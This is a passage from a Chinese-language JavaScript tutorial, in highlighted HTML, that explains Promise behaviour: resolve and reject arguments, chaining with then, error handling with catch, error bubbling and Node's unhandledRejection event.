class="keyword">if</span> (<span class="keyword">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        resolve(<span class="keyword">this</span>.response);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="keyword">this</span>.statusText));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">const</span> client = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    client.open(<span class="string">"GET"</span>, url);</span><br><span class="line">    client.onreadystatechange = handler;</span><br><span class="line">    client.responseType = <span class="string">"json"</span>;</span><br><span class="line">    client.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"application/json"</span>);</span><br><span class="line">    client.send();</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> promise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Contents: '</span> + json);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'出错了'</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>getJSON</code>是对 XMLHttpRequest 对象的封装，用于发出一个针对 JSON 数据的 HTTP 请求，并且返回一个<code>Promise</code>对象。需要注意的是，在<code>getJSON</code>内部，<code>resolve</code>函数和<code>reject</code>函数调用时，都带有参数。</p><p>如果调用<code>resolve</code>函数和<code>reject</code>函数时带有参数，那么它们的参数会被传递给回调函数。<code>reject</code>函数的参数通常是<code>Error</code>对象的实例，表示抛出的错误；<code>resolve</code>函数的参数除了正常的值以外，还可能是另一个 Promise 实例，比如像下面这样。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  resolve(p1);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>和<code>p2</code>都是 Promise 的实例，但是<code>p2</code>的<code>resolve</code>方法将<code>p1</code>作为参数，即一个异步操作的结果是返回另一个异步操作。</p><p>注意，这时<code>p1</code>的状态就会传递给<code>p2</code>，也就是说，<code>p1</code>的状态决定了<code>p2</code>的状态。如果<code>p1</code>的状态是<code>pending</code>，那么<code>p2</code>的回调函数就会等待<code>p1</code>的状态改变；如果<code>p1</code>的状态已经是<code>resolved</code>或者<code>rejected</code>，那么<code>p2</code>的回调函数将会立刻执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail'</span>)), <span class="number">3000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(p1), <span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p2</span><br><span class="line">  .then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">  .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(error))</span><br><span class="line"><span class="comment">// Error: fail</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>是一个 Promise，3 秒之后变为<code>rejected</code>。<code>p2</code>的状态在 1 秒之后改变，<code>resolve</code>方法返回的是<code>p1</code>。由于<code>p2</code>返回的是另一个 Promise，导致<code>p2</code>自己的状态无效了，由<code>p1</code>的状态决定<code>p2</code>的状态。所以，后面的<code>then</code>语句都变成针对后者（<code>p1</code>）。又过了 2 秒，<code>p1</code>变为<code>rejected</code>，导致触发<code>catch</code>方法指定的回调函数。</p><p>注意，调用<code>resolve</code>或<code>reject</code>并不会终结 Promise 的参数函数的执行。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;).then(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(r);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>上面代码中，调用<code>resolve(1)</code>以后，后面的<code>console.log(2)</code>还是会执行，并且会首先打印出来。这是因为立即 resolved 的 Promise 是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务。</p><p>一般来说，调用<code>resolve</code>或<code>reject</code>以后，Promise 的使命就完成了，后继操作应该放到<code>then</code>方法里面，而不应该直接写在<code>resolve</code>或<code>reject</code>的后面。所以，最好在它们前面加上<code>return</code>语句，这样就不会有意外。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> resolve(<span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 后面的语句不会执行</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">2</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Promise-prototype-then"><a href="#Promise-prototype-then" class="headerlink" title="Promise.prototype.then()"></a>Promise.prototype.then()</h2><p>Promise 实例具有<code>then</code>方法，也就是说，<code>then</code>方法是定义在原型对象<code>Promise.prototype</code>上的。它的作用是为 Promise 实例添加状态改变时的回调函数。前面说过，<code>then</code>方法的第一个参数是<code>resolved</code>状态的回调函数，第二个参数（可选）是<code>rejected</code>状态的回调函数。</p><p><code>then</code>方法返回的是一个新的<code>Promise</code>实例（注意，不是原来那个<code>Promise</code>实例）。因此可以采用链式写法，即<code>then</code>方法后面再调用另一个<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/posts.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> json.post;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码使用<code>then</code>方法，依次指定了两个回调函数。第一个回调函数完成以后，会将返回结果作为参数，传入第二个回调函数。</p><p>采用链式的<code>then</code>，可以指定一组按照次序调用的回调函数。这时，前一个回调函数，有可能返回的还是一个<code>Promise</code>对象（即有异步操作），这时后一个回调函数，就会等待该<code>Promise</code>对象的状态发生变化，才会被调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/post/1.json"</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"resolved: "</span>, comments);</span><br><span class="line">&#125;, <span class="function"><span class="keyword">function</span> <span class="title">funcB</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"rejected: "</span>, err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，第一个<code>then</code>方法指定的回调函数，返回的是另一个<code>Promise</code>对象。这时，第二个<code>then</code>方法指定的回调函数，就会等待这个新的<code>Promise</code>对象状态发生变化。如果变为<code>resolved</code>，就调用<code>funcA</code>，如果状态变为<code>rejected</code>，就调用<code>funcB</code>。</p><p>如果采用箭头函数，上面的代码可以写得更简洁。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">"/post/1.json"</span>).then(</span><br><span class="line">  post =&gt; getJSON(post.commentURL)</span><br><span class="line">).then(</span><br><span class="line">  comments =&gt; <span class="built_in">console</span>.log(<span class="string">"resolved: "</span>, comments),</span><br><span class="line">  err =&gt; <span class="built_in">console</span>.log(<span class="string">"rejected: "</span>, err)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="Promise-prototype-catch"><a href="#Promise-prototype-catch" class="headerlink" title="Promise.prototype.catch()"></a>Promise.prototype.catch()</h2><p><code>Promise.prototype.catch</code>方法是<code>.then(null, rejection)</code>的别名，用于指定发生错误时的回调函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">'/posts.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理 getJSON 和 前一个回调函数运行时发生的错误</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'发生错误！'</span>, error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>getJSON</code>方法返回一个 Promise 对象，如果该对象状态变为<code>resolved</code>，则会调用<code>then</code>方法指定的回调函数；如果异步操作抛出错误，状态就会变为<code>rejected</code>，就会调用<code>catch</code>方法指定的回调函数，处理这个错误。另外，<code>then</code>方法指定的回调函数，如果运行中抛出错误，也会被<code>catch</code>方法捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p.then(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'fulfilled:'</span>, val))</span><br><span class="line">  .catch(<span class="function">(<span class="params">err</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'rejected'</span>, err));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">p.then(<span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'fulfilled:'</span>, val))</span><br><span class="line">  .then(<span class="literal">null</span>, (err) =&gt; <span class="built_in">console</span>.log(<span class="string">"rejected:"</span>, err));</span><br></pre></td></tr></table></figure><p>下面是一个例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// Error: test</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>promise</code>抛出一个错误，就被<code>catch</code>方法指定的回调函数捕获。注意，上面的写法与下面两种写法是等价的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    reject(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>));</span><br><span class="line">&#125;);</span><br><span class="line">promise.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>比较上面两种写法，可以发现<code>reject</code>方法的作用，等同于抛出错误。</p><p>如果 Promise 状态已经变成<code>resolved</code>，再抛出错误是无效的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="string">'ok'</span>);</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123; <span class="built_in">console</span>.log(value) &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123; <span class="built_in">console</span>.log(error) &#125;);</span><br><span class="line"><span class="comment">// ok</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 在<code>resolve</code>语句后面，再抛出错误，不会被捕获，等于没有抛出。因为 Promise 的状态一旦改变，就永久保持该状态，不会再变了。</p><p>Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。也就是说，错误总是会被下一个<code>catch</code>语句捕获。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">'/post/1.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理前面三个Promise产生的错误</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，一共有三个 Promise 对象：一个由<code>getJSON</code>产生，两个由<code>then</code>产生。它们之中任何一个抛出的错误，都会被最后一个<code>catch</code>捕获。</p><p>一般来说，不要在<code>then</code>方法里面定义 Reject 状态的回调函数（即<code>then</code>的第二个参数），总是使用<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// error</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123; <span class="comment">//cb</span></span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// error</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面<code>then</code>方法执行中的错误，也更接近同步的写法（<code>try/catch</code>）。因此，建议总是使用<code>catch</code>方法，而不使用<code>then</code>方法的第二个参数。</p><p>跟传统的<code>try/catch</code>代码块不同的是，如果没有使用<code>catch</code>方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someAsyncThing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 下面一行会报错，因为x没有声明</span></span><br><span class="line">    resolve(x + <span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">someAsyncThing().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'everything is great'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="built_in">console</span>.log(<span class="number">123</span>) &#125;, <span class="number">2000</span>);</span><br><span class="line"><span class="comment">// Uncaught (in promise) ReferenceError: x is not defined</span></span><br><span class="line"><span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>someAsyncThing</code>函数产生的 Promise 对象，内部有语法错误。浏览器运行到这一行，会打印出错误提示<code>ReferenceError: x is not defined</code>，但是不会退出进程、终止脚本执行，2 秒之后还是会输出<code>123</code>。这就是说，Promise 内部的错误不会影响到 Promise 外部的代码，通俗的说法就是“Promise 会吃掉错误”。</p><p>这个脚本放在服务器执行，退出码就是<code>0</code>（即表示执行成功）。不过，Node 有一个<code>unhandledRejection</code>事件，专门监听未捕获的<code>reject</code>错误，上面的脚本会触发这个事件的监听函数，可以在监听函数里面抛出错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">process.on(<span class="string">'unhandledRejection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, p</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> err;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>unhandledRejection</code>事件的监听函数有两个参数，第一个是错误对象，第二个是报错的 Promise 实例，它可以用来了解发生错误的环境信息。</p><p>注意，Node 有计划在未来废除<code>unhandledRejection</code>事件。如果 Promise 内部有未捕获的错误，会直接终止进程，并且进程的退出码不为 0。</p><p>再看下面的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="string">'ok'</span>);</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>) &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;);</span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123; <span class="built_in">console</span>.log(value) &#125;);</span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line"><span class="comment">// Uncaught Error: test</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 指定在下一轮“事件循环”再抛出错误。到了那个时候，Promise 的运行已经结束了，所以这个错误是在 Promise 函数体外抛出的，会冒泡到最外层，成了未捕获的错误。</p><p>一般总是建议，Promise 对象后面要跟<code>catch</code>方法，这样可以处理 Promise 内部发生的错误。<code>catch</code>方法返回的还是一个 Promise 对象，因此后面还可以接着调用<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someAsyncThing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 下面一行会报错，因为x没有声明</span></span><br><span class="line">    resolve(x + <span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">someAsyncThing()</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// oh no [ReferenceError: x is not defined]</span></span><br><span class="line"><span class="comment">// carry on</span></span><br></pre></td></tr></table></figure><p>上面代码运行完<code>catch</code>方法指定的回调函数，会接着运行后面那个<code>then</code>方法指定的回调函数。如果没有报错，则会跳过<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve()</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// carry on</span></span><br></pre></td></tr></table></figure><p>上面的代码因为没有报错，跳过了<code>catch</code>方法，直接执行后面的<code>then</code>方法。此时，要是<code>then</code>方法里面报错，就与前面的<code>catch</code>无关了。</p><p><code>catch</code>方法之中，还能再抛出错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someAsyncThing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 下面一行会报错，因为x没有声明</span></span><br><span class="line">    resolve(x + <span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">someAsyncThing().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> someOtherAsyncThing();</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">  <span class="comment">// 下面一行会报错，因为 y 没有声明</span></span><br><span class="line">  y + <span class="number">2</span>;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// oh no [ReferenceError: x is not defined]</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>catch</code>方法抛出一个错误，因为后面没有别的<code>catch</code>方法了，导致这个错误不会被捕获，也不会传递到外层。如果改写一下，结果就不一样了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">someAsyncThing().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> someOtherAsyncThing();</span><br><span class="line">&#125;).catch(<span class="function"><span 